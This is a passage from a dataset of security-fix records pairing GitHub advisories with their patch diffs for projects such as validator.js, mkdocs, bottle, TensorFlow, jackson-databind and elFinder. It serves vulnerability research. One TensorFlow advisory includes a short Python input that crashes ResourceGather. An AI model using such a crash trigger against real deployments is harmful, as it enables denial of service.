'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/count_ops.cc'])","num_files":1.0},{"index":2750,"vuln_id":"GHSA-qgmg-gppg-76g5","cwe_id":"{'CWE-1333'}","score":5.3,"chain":"{'https:\/\/github.com\/validatorjs\/validator.js\/commit\/496fc8b2a7f5997acaaec33cc44d0b8dba5fb5e1'}","dataset":"osv","summary":"Inefficient Regular Expression Complexity in validator.js validator.js prior to 13.7.0 is vulnerable to Inefficient Regular Expression Complexity","published_date":"2021-11-03","chain_len":1,"project":"https:\/\/github.com\/validatorjs\/validator.js","commit_href":"https:\/\/github.com\/validatorjs\/validator.js\/commit\/496fc8b2a7f5997acaaec33cc44d0b8dba5fb5e1","commit_sha":"496fc8b2a7f5997acaaec33cc44d0b8dba5fb5e1","patch":"SINGLE","chain_ord":"['496fc8b2a7f5997acaaec33cc44d0b8dba5fb5e1']","before_first_fix_commit":"{'45901ec4f1276d192da6d0eb10a60b64722356c1'}","last_fix_commit":"496fc8b2a7f5997acaaec33cc44d0b8dba5fb5e1","chain_ord_pos":1.0,"commit_datetime":"11\/01\/2021, 20:30:39","message":"fix(rtrim): remove regex to prevent ReDOS attack (#1738)","author":"Sarhan Aissi","comments":null,"stats":"{'additions': 12, 'deletions': 3, 'total': 15}","files":"{'src\/lib\/rtrim.js': {'additions': 12, 'deletions': 3, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/validatorjs\/validator.js\/raw\/496fc8b2a7f5997acaaec33cc44d0b8dba5fb5e1\/src%2Flib%2Frtrim.js', 'patch': \"@@ -2,7 +2,16 @@ import assertString from '.\/util\/assertString';\\n \\n export default function rtrim(str, chars) {\\n   assertString(str);\\n-  \/\/ https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Guide\/Regular_Expressions#Escaping\\n-  const pattern = chars ? new RegExp(`[${chars.replace(\/[.*+?^${}()|[\\\\]\\\\\\\\]\/g, '\\\\\\\\$&')}]+$`, 'g') : \/(\\\\s)+$\/g;\\n-  return str.replace(pattern, '');\\n+  if (chars) {\\n+    \/\/ https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Guide\/Regular_Expressions#Escaping\\n+    const pattern = new RegExp(`[${chars.replace(\/[.*+?^${}()|[\\\\]\\\\\\\\]\/g, '\\\\\\\\$&')}]+$`, 'g');\\n+    return str.replace(pattern, '');\\n+  }\\n+  \/\/ Use a faster and more safe than regex trim method https:\/\/blog.stevenlevithan.com\/archives\/faster-trim-javascript\\n+  let strIndex = str.length - 1;\\n+  while (\/\\\\s\/.test(str.charAt(strIndex))) {\\n+    strIndex -= 1;\\n+  }\\n+\\n+  return str.slice(0, strIndex + 1);\\n }\"}}","message_norm":"fix(rtrim): remove regex to prevent redos attack (#1738)","language":"en","entities":"[('fix(rtrim', 'ACTION', ''), ('remove', 'ACTION', ''), ('prevent', 'ACTION', ''), ('redos', 'SECWORD', ''), ('attack', 'FLAW', ''), ('#1738', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib\/rtrim.js'])","num_files":1.0},{"index":2756,"vuln_id":"GHSA-qh9q-34h6-hcv9","cwe_id":"{'CWE-12', 'CWE-22'}","score":7.5,"chain":"{'https:\/\/github.com\/mkdocs\/mkdocs\/pull\/2604\/commits\/cddc453c9d49298e60e7d56fb71130c151cbcbe5'}","dataset":"osv","summary":"Directory traversal in mkdocs The mkdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain :sensitive information.","published_date":"2021-10-12","chain_len":1,"project":"https:\/\/github.com\/mkdocs\/mkdocs","commit_href":"https:\/\/github.com\/mkdocs\/mkdocs\/pull\/2604\/commits\/cddc453c9d49298e60e7d56fb71130c151cbcbe5","commit_sha":"cddc453c9d49298e60e7d56fb71130c151cbcbe5","patch":"SINGLE","chain_ord":"['cddc453c9d49298e60e7d56fb71130c151cbcbe5']","before_first_fix_commit":"{'c426455878556baa34cc829c579337236d335581'}","last_fix_commit":"cddc453c9d49298e60e7d56fb71130c151cbcbe5","chain_ord_pos":1.0,"commit_datetime":"10\/10\/2021, 08:52:05","message":"Prevent directory traversal in the dev server","author":"Oleh Prypin","comments":null,"stats":"{'additions': 4, 'deletions': 1, 'total': 5}","files":"{'mkdocs\/livereload\/__init__.py': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mkdocs\/mkdocs\/raw\/cddc453c9d49298e60e7d56fb71130c151cbcbe5\/mkdocs%2Flivereload%2F__init__.py', 'patch': '@@ -4,6 +4,7 @@\\n import mimetypes\\n import os\\n import os.path\\n+import posixpath\\n import re\\n import socketserver\\n import threading\\n@@ -183,9 +184,11 @@ def condition():\\n         if path == \"\/js\/livereload.js\":\\n             file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), \"livereload.js\")\\n         elif path.startswith(self.mount_path):\\n-            rel_file_path = path[len(self.mount_path):].lstrip(\"\/\")\\n+            rel_file_path = path[len(self.mount_path):]\\n             if path.endswith(\"\/\"):\\n                 rel_file_path += \"index.html\"\\n+            # Prevent directory traversal - normalize the path.\\n+            rel_file_path = posixpath.normpath(\"\/\" + rel_file_path).lstrip(\"\/\")\\n             file_path = os.path.join(self.root, rel_file_path)\\n         elif path == \"\/\":\\n             start_response(\"302 Found\", [(\"Location\", self.mount_path)])'}}","message_norm":"prevent directory traversal in the dev server","language":"en","entities":"[('prevent', 'ACTION', ''), ('directory traversal', 'SECWORD', ''), ('server', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['mkdocs\/livereload\/__init__.py'])","num_files":1.0},{"index":2758,"vuln_id":"GHSA-qhh5-9738-g9mx","cwe_id":"{'CWE-276'}","score":6.5,"chain":"{'https:\/\/github.com\/apache\/incubator-dolphinscheduler\/commit\/b8a9e2e00f2f207ae60c913a7173b59405ff95f1'}","dataset":"osv","summary":"Incorrect Default Permissions in Apache DolphinScheduler Versions of Apache DolphinScheduler prior to 1.3.2 allowed an ordinary user under any tenant to override another users password through the API interface.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/apache\/incubator-dolphinscheduler","commit_href":"https:\/\/github.com\/apache\/incubator-dolphinscheduler\/commit\/b8a9e2e00f2f207ae60c913a7173b59405ff95f1","commit_sha":"b8a9e2e00f2f207ae60c913a7173b59405ff95f1","patch":"SINGLE","chain_ord":"['b8a9e2e00f2f207ae60c913a7173b59405ff95f1']","before_first_fix_commit":"{'0505ebf45d93fc1518386804ceffa6b36595f9c5'}","last_fix_commit":"b8a9e2e00f2f207ae60c913a7173b59405ff95f1","chain_ord_pos":1.0,"commit_datetime":"08\/18\/2020, 06:07:47","message":"modify general user can't create,delete,update token (#3538)\n\nCo-authored-by: qiaozhanwei <qiaozhanwei@analysys.com.cn>","author":"qiaozhanwei","comments":null,"stats":"{'additions': 7, 'deletions': 8, 'total': 15}","files":"{'dolphinscheduler-api\/src\/main\/java\/org\/apache\/dolphinscheduler\/api\/service\/AccessTokenService.java': {'additions': 7, 'deletions': 8, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/dolphinscheduler\/raw\/b8a9e2e00f2f207ae60c913a7173b59405ff95f1\/dolphinscheduler-api%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Fdolphinscheduler%2Fapi%2Fservice%2FAccessTokenService.java', 'patch': '@@ -84,7 +84,9 @@ public Map<String, Object> queryAccessTokenList(User loginUser, String searchVal\\n      *\/\\n     public Map<String, Object> createToken(User loginUser, int userId, String expireTime, String token) {\\n         Map<String, Object> result = new HashMap<>(5);\\n-        if(check(result, !isAdmin(loginUser), Status.USER_NO_OPERATION_PERM)){\\n+\\n+        if (!hasPerm(loginUser,userId)){\\n+            putMsg(result, Status.USER_NO_OPERATION_PERM);\\n             return result;\\n         }\\n \\n@@ -140,10 +142,6 @@ public Map<String, Object> generateToken(User loginUser, int userId, String expi\\n     public Map<String, Object> delAccessTokenById(User loginUser, int id) {\\n         Map<String, Object> result = new HashMap<>(5);\\n \\n-        if(check(result, !isAdmin(loginUser), Status.USER_NO_OPERATION_PERM)){\\n-            return result;\\n-        }\\n-\\n         AccessToken accessToken = accessTokenMapper.selectById(id);\\n \\n         if (accessToken == null) {\\n@@ -152,8 +150,7 @@ public Map<String, Object> delAccessTokenById(User loginUser, int id) {\\n             return result;\\n         }\\n \\n-        if (loginUser.getId() != accessToken.getUserId() &&\\n-                loginUser.getUserType() != UserType.ADMIN_USER) {\\n+        if (!hasPerm(loginUser,accessToken.getUserId())){\\n             putMsg(result, Status.USER_NO_OPERATION_PERM);\\n             return result;\\n         }\\n@@ -176,9 +173,11 @@ public Map<String, Object> delAccessTokenById(User loginUser, int id) {\\n     public Map<String, Object> updateToken(User loginUser, int id, int userId, String expireTime, String token) {\\n         Map<String, Object> result = new HashMap<>(5);\\n \\n-        if(check(result, !isAdmin(loginUser), Status.USER_NO_OPERATION_PERM)){\\n+        if (!hasPerm(loginUser,userId)){\\n+            putMsg(result, Status.USER_NO_OPERATION_PERM);\\n             return result;\\n         }\\n+\\n         AccessToken accessToken = accessTokenMapper.selectById(id);\\n         if (accessToken == null) {\\n             logger.error(\"access token not exist,  access token id {}\", id);'}}","message_norm":"modify general user can't create,delete,update token (#3538)\n\nco-authored-by: qiaozhanwei <qiaozhanwei@analysys.com.cn>","language":"en","entities":"[('update', 'ACTION', ''), ('#3538', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['dolphinscheduler-api\/src\/main\/java\/org\/apache\/dolphinscheduler\/api\/service\/AccessTokenService.java'])","num_files":1.0},{"index":2760,"vuln_id":"GHSA-qhmp-h54x-38qr","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/caronc\/apprise\/commit\/e20fce630d55e4ca9b0a1e325a5fea6997489831'}","dataset":"osv","summary":"CWE-730 Regex injection with IFTTT Plugin ### Impact\r\nAnyone _publicly_ hosting the Apprise library and granting them access to the IFTTT notification service.\r\n\r\n### Patches\r\nUpdate to Apprise v0.9.5.1\r\n   ```bash\r\n   # Install Apprise v0.9.5.1 from PyPI\r\n   pip install apprise==0.9.5.1\r\n   ```\r\n\r\nThe patch to the problem was performed [here](https:\/\/github.com\/caronc\/apprise\/pull\/436\/files).\r\n\r\n### Workarounds\r\nAlternatively, if upgrading is not an option, you can safely remove the following file:\r\n- `apprise\/plugins\/NotifyIFTTT.py` \r\n\r\nThe above will eliminate the ability to use IFTTT, but everything else will work smoothly.\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [Apprise](https:\/\/github.com\/caronc\/apprise\/issues)\r\n* Email me at [lead2gold@gmail.com](mailto:lead2gold@gmail.com)\r\n\r\n### Additional Credit\r\nGithub would not allow me to additionally credit **Rasmus Petersen**, but I would like to put that here at the very least - thank you for finding and reporting this issue along with those already credited\r\n\r\n## Additional Notes:\r\n- Github would not allow me to add\/tag the 2 CWE's this issue is applicable to (only CWE-400).  The other is: CWE-730 (placed in the title)","published_date":"2021-09-20","chain_len":1,"project":"https:\/\/github.com\/caronc\/apprise","commit_href":"https:\/\/github.com\/caronc\/apprise\/commit\/e20fce630d55e4ca9b0a1e325a5fea6997489831","commit_sha":"e20fce630d55e4ca9b0a1e325a5fea6997489831","patch":"SINGLE","chain_ord":"['e20fce630d55e4ca9b0a1e325a5fea6997489831']","before_first_fix_commit":"{'81d1ea72bcee4441278a809a95fc0f91dc916402'}","last_fix_commit":"e20fce630d55e4ca9b0a1e325a5fea6997489831","chain_ord_pos":1.0,"commit_datetime":"09\/06\/2021, 17:51:32","message":"Slight bulletproofing to IFTTT regex handling (#436)","author":"Chris Caron","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'apprise\/plugins\/NotifyIFTTT.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/caronc\/apprise\/raw\/e20fce630d55e4ca9b0a1e325a5fea6997489831\/apprise%2Fplugins%2FNotifyIFTTT.py', 'patch': \"@@ -355,7 +355,7 @@ def parse_native_url(url):\\n         result = re.match(\\n             r'^https?:\/\/maker\\\\.ifttt\\\\.com\/use\/'\\n             r'(?P<webhook_id>[A-Z0-9_-]+)'\\n-            r'\/?(?P<events>([A-Z0-9_-]+\/?)+)?'\\n+            r'((?P<events>(\/[A-Z0-9_-]+)+))?'\\n             r'\/?(?P<params>\\\\?.+)?$', url, re.I)\\n \\n         if result:\"}}","message_norm":"slight bulletproofing to ifttt regex handling (#436)","language":"no","entities":"[('#436', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['apprise\/plugins\/NotifyIFTTT.py'])","num_files":1.0},{"index":2764,"vuln_id":"GHSA-qhx9-7hx7-cp4r","cwe_id":"{'CWE-444'}","score":6.8,"chain":"{'https:\/\/github.com\/bottlepy\/bottle\/commit\/57a2f22e0c1d2b328c4f54bf75741d74f47f1a6b'}","dataset":"osv","summary":"HTTP Request smuggling in bottle The package bottle before 0.12.19 are vulnerable to Web Cache Poisoning by using a vector called parameter cloaking. When the attacker can separate query parameters using a semicolon (;), they can cause a difference in the interpretation of the request between the proxy (running with default configuration) and the server. This can result in malicious requests being cached as completely safe ones, as the proxy would usually not see the semicolon as a separator, and therefore would not include it in a cache key of an unkeyed parameter.","published_date":"2021-04-07","chain_len":1,"project":"https:\/\/github.com\/bottlepy\/bottle","commit_href":"https:\/\/github.com\/bottlepy\/bottle\/commit\/57a2f22e0c1d2b328c4f54bf75741d74f47f1a6b","commit_sha":"57a2f22e0c1d2b328c4f54bf75741d74f47f1a6b","patch":"SINGLE","chain_ord":"['57a2f22e0c1d2b328c4f54bf75741d74f47f1a6b']","before_first_fix_commit":"{'2d6acef676d35611dc58ca9c3bac51789adbcce8'}","last_fix_commit":"57a2f22e0c1d2b328c4f54bf75741d74f47f1a6b","chain_ord_pos":1.0,"commit_datetime":"11\/11\/2020, 18:24:29","message":"Do not split query strings on `;` anymore.\n\nUsing `;` as a separator instead of `&` was allowed a long time ago,\nbut is now obsolete and actually invalid according to the 2014 W3C\nrecommendations. Even if this change is technically backwards-incompatible,\nno real-world application should depend on broken behavior. If you REALLY\nneed this functionality, monkey-patch the _parse_qsl() function.","author":"Marcel Hellkamp","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'bottle.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bottlepy\/bottle\/raw\/57a2f22e0c1d2b328c4f54bf75741d74f47f1a6b\/bottle.py', 'patch': \"@@ -2585,7 +2585,7 @@ def parse_range_header(header, maxlen=0):\\n \\n def _parse_qsl(qs):\\n     r = []\\n-    for pair in qs.replace(';','&').split('&'):\\n+    for pair in qs.split('&'):\\n         if not pair: continue\\n         nv = pair.split('=', 1)\\n         if len(nv) != 2: nv.append('')\"}}","message_norm":"do not split query strings on `;` anymore.\n\nusing `;` as a separator instead of `&` was allowed a long time ago,\nbut is now obsolete and actually invalid according to the 2014 w3c\nrecommendations. even if this change is technically backwards-incompatible,\nno real-world application should depend on broken behavior. if you really\nneed this functionality, monkey-patch the _parse_qsl() function.","language":"en","entities":"[('monkey', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bottle.py'])","num_files":1.0},{"index":2765,"vuln_id":"GHSA-qhxx-j73r-qpm2","cwe_id":"{'CWE-908'}","score":4.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2'}","dataset":"osv","summary":"Uninitialized memory access in TensorFlow ### Impact\nUnder certain cases, a saved model can trigger use of uninitialized values during code execution. This is caused by having tensor buffers be filled with the default value of the type but forgetting to [default initialize the quantized floating point types in Eigen](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f70160322a579144950dff1537dcbe3c7c09d6f5\/third_party\/eigen3\/unsupported\/Eigen\/CXX11\/src\/FixedPoint\/FixedPointTypes.h#L61-L104):\n\n```cc\nstruct QUInt8 {\n  QUInt8() {}\n  \/\/ ...\n  uint8_t value;\n};\n\nstruct QInt16 {\n  QInt16() {}\n  \/\/ ...\n  int16_t value;\n};\n\nstruct QUInt16 {\n  QUInt16() {}\n  \/\/ ...\n  uint16_t value;\n};\n\nstruct QInt32 {\n  QInt32() {}\n  \/\/ ...\n  int32_t value;\n};\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2020-12-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2","commit_sha":"ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2","patch":"SINGLE","chain_ord":"['ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2']","before_first_fix_commit":"{'f70160322a579144950dff1537dcbe3c7c09d6f5'}","last_fix_commit":"ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2","chain_ord_pos":1.0,"commit_datetime":"11\/24\/2020, 19:40:42","message":"Default initialize fixed point Eigen types.\n\nIn certain cases, tensors are filled with default values of the type. But, for these fixed point types, these values were uninitialized. Thus, we would have uninitialized memory access bugs, some of which were caught by MSAN.\n\nPiperOrigin-RevId: 344101137\nChange-Id: I14555fda74dca3b5f1582da9008901937e3f14e2","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 5, 'total': 10}","files":"{'third_party\/eigen3\/unsupported\/Eigen\/CXX11\/src\/FixedPoint\/FixedPointTypes.h': {'additions': 5, 'deletions': 5, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2\/third_party%2Feigen3%2Funsupported%2FEigen%2FCXX11%2Fsrc%2FFixedPoint%2FFixedPointTypes.h', 'patch': '@@ -49,7 +49,7 @@ struct scalar_product_traits<QInt32, double> {\\n \/\/ the compiler from silently type cast the mantissa into a bigger or a smaller\\n \/\/ representation.\\n struct QInt8 {\\n-  QInt8() {}\\n+  QInt8() : value(0) {}\\n   QInt8(const int8_t v) : value(v) {}\\n   QInt8(const QInt32 v);\\n \\n@@ -59,7 +59,7 @@ struct QInt8 {\\n };\\n \\n struct QUInt8 {\\n-  QUInt8() {}\\n+  QUInt8() : value(0) {}\\n   QUInt8(const uint8_t v) : value(v) {}\\n   QUInt8(const QInt32 v);\\n \\n@@ -69,7 +69,7 @@ struct QUInt8 {\\n };\\n \\n struct QInt16 {\\n-  QInt16() {}\\n+  QInt16() : value(0) {}\\n   QInt16(const int16_t v) : value(v) {}\\n   QInt16(const QInt32 v);\\n   operator int() const { return static_cast<int>(value); }\\n@@ -78,7 +78,7 @@ struct QInt16 {\\n };\\n \\n struct QUInt16 {\\n-  QUInt16() {}\\n+  QUInt16() : value(0) {}\\n   QUInt16(const uint16_t v) : value(v) {}\\n   QUInt16(const QInt32 v);\\n   operator int() const { return static_cast<int>(value); }\\n@@ -87,7 +87,7 @@ struct QUInt16 {\\n };\\n \\n struct QInt32 {\\n-  QInt32() {}\\n+  QInt32() : value(0) {}\\n   QInt32(const int8_t v) : value(v) {}\\n   QInt32(const int32_t v) : value(v) {}\\n   QInt32(const uint32_t v) : value(static_cast<int32_t>(v)) {}'}}","message_norm":"default initialize fixed point eigen types.\n\nin certain cases, tensors are filled with default values of the type. but, for these fixed point types, these values were uninitialized. thus, we would have uninitialized memory access bugs, some of which were caught by msan.\n\npiperorigin-revid: 344101137\nchange-id: i14555fda74dca3b5f1582da9008901937e3f14e2","language":"en","entities":"[('initialize', 'SECWORD', ''), ('fixed', 'ACTION', ''), ('fixed', 'ACTION', ''), ('uninitialized', 'SECWORD', ''), ('uninitialized memory', 'SECWORD', ''), ('bugs', 'FLAW', ''), ('344101137', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['third_party\/eigen3\/unsupported\/Eigen\/CXX11\/src\/FixedPoint\/FixedPointTypes.h'])","num_files":1.0},{"index":2771,"vuln_id":"GHSA-qjj8-32p7-h289","cwe_id":"{'CWE-369'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ac117ee8a8ea57b73d34665cdf00ef3303bc0b11'}","dataset":"osv","summary":"Division by 0 in `ResourceGather` ### Impact\nAn attacker can trigger a crash via a floating point exception in `tf.raw_ops.ResourceGather`:\n\n```python\nimport tensorflow as tf\n\ntensor = tf.constant(value=[[]],shape=(0,1),dtype=tf.uint32)\nv = tf.Variable(tensor)\ntf.raw_ops.ResourceGather(\n  resource=v.handle,\n  indices=[0],\n  dtype=tf.uint32,\n  batch_dims=1,\n  validate_indices=False)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f24faa153ad31a4b51578f8181d3aaab77a1ddeb\/tensorflow\/core\/kernels\/resource_variable_ops.cc#L725-L731) computes the value of a value, `batch_size`, and then divides by it without checking that this value is not 0. \n\n### Patches\nWe have patched the issue in GitHub commit  [ac117ee8a8ea57b73d34665cdf00ef3303bc0b11](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ac117ee8a8ea57b73d34665cdf00ef3303bc0b11).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ac117ee8a8ea57b73d34665cdf00ef3303bc0b11","commit_sha":"ac117ee8a8ea57b73d34665cdf00ef3303bc0b11","patch":"SINGLE","chain_ord":"['ac117ee8a8ea57b73d34665cdf00ef3303bc0b11']","before_first_fix_commit":"{'3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d'}","last_fix_commit":"ac117ee8a8ea57b73d34665cdf00ef3303bc0b11","chain_ord_pos":1.0,"commit_datetime":"07\/31\/2021, 05:23:28","message":"Prevent division by 0 in `resource_variable_ops.cc`\n\nPiperOrigin-RevId: 387939939\nChange-Id: Ib04902d63756633999959a70613f2eaa30c2c151","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 9, 'deletions': 2, 'total': 11}","files":"{'tensorflow\/core\/kernels\/resource_variable_ops.cc': {'additions': 9, 'deletions': 2, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ac117ee8a8ea57b73d34665cdf00ef3303bc0b11\/tensorflow%2Fcore%2Fkernels%2Fresource_variable_ops.cc', 'patch': '@@ -710,7 +710,8 @@ class ResourceGatherOp : public OpKernel {\\n         copy_functor(c->eigen_device<Device>(), tmp_indices.flat<Index>(),\\n                      indices.flat<Index>());\\n \\n-        AddBatchOffsets(&tmp_indices, params);\\n+        AddBatchOffsets(c, &tmp_indices, params);\\n+        if (!c->status().ok()) return;\\n         op_indices = &tmp_indices;\\n       }\\n \\n@@ -742,11 +743,17 @@ class ResourceGatherOp : public OpKernel {\\n   \/\/ Example: batch_dims = 1, indices = [[0, 1, 2], [0, 1, 2]]\\n   \/\/ If indexing into a params dimension of size 4, then the indices will become\\n   \/\/ [0, 1, 2, 4, 5, 6]\\n-  void AddBatchOffsets(Tensor* indices, const Tensor& params) {\\n+  void AddBatchOffsets(OpKernelContext* ctx, Tensor* indices,\\n+                       const Tensor& params) {\\n     int64_t batch_size = 1;  \/\/ The size of all batch dimensions.\\n     for (int idx = 0; idx < batch_dims_; ++idx) {\\n       batch_size *= params.dim_size(idx);\\n     }\\n+    OP_REQUIRES(\\n+        ctx, batch_size != 0,\\n+        errors::InvalidArgument(\\n+            \"Inner size of indices would result in batch_size of 0 and a \",\\n+            \"division by 0 in the implementation. This is illegal\"));\\n \\n     auto indices_flat = indices->flat<Index>();\\n     int64_t const index_inner_size = indices->NumElements() \/ batch_size;'}}","message_norm":"prevent division by 0 in `resource_variable_ops.cc`\n\npiperorigin-revid: 387939939\nchange-id: ib04902d63756633999959a70613f2eaa30c2c151","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('387939939', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/resource_variable_ops.cc'])","num_files":1.0},{"index":2774,"vuln_id":"GHSA-qjw2-hr98-qgfh","cwe_id":"{'CWE-502'}","score":8.1,"chain":"{'https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/ad5a630174f08d279504bc51ebba8772fd71b86b', 'https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/2118e71325486c68f089a9761c9d8a11b4ddd1cb'}","dataset":"osv","summary":"Unsafe Deserialization in jackson-databind FasterXML jackson-databind 2.x before 2.6.7.5 and from 2.7.x before 2.9.10.6 mishandles the interaction between serialization gadgets and typing, related to com.pastdev.httpcomponents.configuration.JndiConfiguration.","published_date":"2021-12-09","chain_len":2,"project":"https:\/\/github.com\/FasterXML\/jackson-databind","commit_href":"https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/ad5a630174f08d279504bc51ebba8772fd71b86b","commit_sha":"ad5a630174f08d279504bc51ebba8772fd71b86b","patch":"MULTI","chain_ord":"['ad5a630174f08d279504bc51ebba8772fd71b86b', '2118e71325486c68f089a9761c9d8a11b4ddd1cb']","before_first_fix_commit":"{'8069e46dd9c288d4a52911ebdc52192cd3d0e96c'}","last_fix_commit":"2118e71325486c68f089a9761c9d8a11b4ddd1cb","chain_ord_pos":1.0,"commit_datetime":"09\/18\/2020, 17:17:24","message":"Add cve id for #2798","author":"Tatu Saloranta","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'release-notes\/VERSION-2.x': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/FasterXML\/jackson-databind\/raw\/ad5a630174f08d279504bc51ebba8772fd71b86b\/release-notes%2FVERSION-2.x', 'patch': '@@ -11,7 +11,7 @@ Project: jackson-databind\\n \\n 2.9.10.6 (24-Aug-2020)\\n \\n-#2798: Block one more gadget type (xxx, CVE-xxxx-xxx)\\n+#2798: Block one more gadget type (com.pastdev.httpcomponents, CVE-2020-24750)\\n  (reported by Al1ex@knownsec)\\n #2814: Block one more gadget type (Anteros-DBCP, CVE-2020-24616)\\n  (reported by ChenZhaojun)'}}","message_norm":"add cve id for #2798","language":"cy","entities":"[('add', 'ACTION', ''), ('cve', 'SECWORD', ''), ('#2798', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['release-notes\/VERSION-2.x'])","num_files":1.0},{"index":2779,"vuln_id":"GHSA-qm58-cvvm-c5qr","cwe_id":"{'CWE-434'}","score":8.1,"chain":"{'https:\/\/github.com\/Studio-42\/elFinder\/commit\/75ea92decc16a5daf7f618f85dc621d1b534b5e1'}","dataset":"osv","summary":"elFinder unsafe upload filtering leading to remote code execution ### Impact\n\nBefore elFinder 2.1.58, the upload filter did not disallow the upload of `.phar` files. As several Linux distributions are now shipping Apache configured in a way it will process these files as PHP scripts, attackers could gain arbitrary code execution on the server hosting the PHP connector (even in minimal configuration).\n\n### Patches\n\nThe issue has been addressed with https:\/\/github.com\/Studio-42\/elFinder\/commit\/75ea92decc16a5daf7f618f85dc621d1b534b5e1, associating `.phar` files to the right MIME type. Unless explicitly allowed in the configuration, such files cannot be uploaded anymore. This patch is part of the last release of elFinder, 2.1.58.\n\n### Workarounds\n\nIf you can't update to 2.1.58, make sure your connector is not exposed without authentication.\n\n### Important tips\n\nServer-side scripts can often be created as text files. Currently, elFinder has an appropriate MIME type set for file extensions that are generally runnable on a web server.\n\nHowever, the server has various settings. In some cases, the executable file may be judged as \"text\/plain\". Therefore, elFinder installers should understand the extensions that can be executed on the web server where elFinder is installed, and check if there are any missing items in the elFinder settings.\n\nThe elFinder PHP connector has an option \"additionalMimeMap\" that specifies the MIME type for each extension. See [#3295(comment)](https:\/\/github.com\/Studio-42\/elFinder\/issues\/3295#issuecomment-853042139) for more information.\n\n### References\n\n- https:\/\/snyk.io\/vuln\/composer:studio-42%2Felfinder\n- https:\/\/github.com\/Studio-42\/elFinder\/issues\/3295\n- Further technical details will be disclosed on https:\/\/blog.sonarsource.com\/tag\/security after some time.\n\n### For more information\n\nIf you have any questions or comments about this advisory, you can contact:\n- The original reporters, by sending an email to  support [at] snyk.io or vulnerability.research [at] sonarsource.com;\n- The maintainers, by opening an issue on this 